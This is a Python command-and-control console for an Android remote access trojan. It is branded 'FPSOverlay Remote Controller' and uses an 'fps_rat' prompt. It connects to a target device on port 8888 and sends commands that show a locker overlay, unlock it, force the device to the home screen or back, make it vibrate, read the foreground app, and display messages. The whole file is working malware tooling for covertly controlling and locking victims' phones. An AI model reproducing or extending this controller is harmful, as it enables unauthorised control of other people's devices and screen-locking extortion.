import socket
import sys

def send_command(ip, port, cmd):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            s.connect((ip, port))
            s.sendall((cmd + "\n").encode())
            response = s.recv(1024).decode().strip()
            return response
    except Exception as e:
        return f"Error: {e}"

def print_banner():
    print("""
    \033[91m
     _  _  ____  ____    ___   __   __ _  ____  __   __    ____
    ( \/ )(  _ \(  _ \  / __) /  \ (  ( \/ ___)/  \ (  )  (  __)
     )  (  ) __/ )   / ( (__ (  O )/    /\___ \  O )/ (_/\ ) _)
    (_/\_)(__)  (__\_)  \___) \__/ \_)__)(____/\__/ \____/(____)
    \033[0m
    [+] FPSOverlay Remote Controller (MSF-Style)
    [+] Target Port: 8888
    """)

def main():
    if len(sys.argv) < 2:
        target_ip = input("\033[92m[?]\033[0m Enter Target IP: ")
    else:
        target_ip = sys.argv[1]

    print_banner()
    print(f"[*] Connecting to {target_ip}...")

    while True:
        try:
            cmd_input = input(f"\033[94mfps_rat\033[0m(\033[91m{target_ip}\033[0m) > ").strip().upper()

            if not cmd_input:
                continue

            if cmd_input == "HELP":
                print("""
                Command       Description
                -------       -----------
                LOCK          Show the locker overlay on target
                UNLOCK        Remove the locker overlay
                VIBRATE       Make target device vibrate
                HOME          Force go to Home Screen
                BACK          Simulate Back button
                SCREEN        Get current foreground app package
                MESSAGE <msg> Show a Toast message on screen
                EXIT          Close this controller
                """)
            elif cmd_input == "EXIT":
                print("[*] Shutting down...")
                break
            else:
                res = send_command(target_ip, 8888, cmd_input)
                print(f"[\033[92m+\033[0m] Response: {res}")

        except KeyboardInterrupt:
            print("\n[*] Exiting...")
            break

if __name__ == "__main__":
    main()
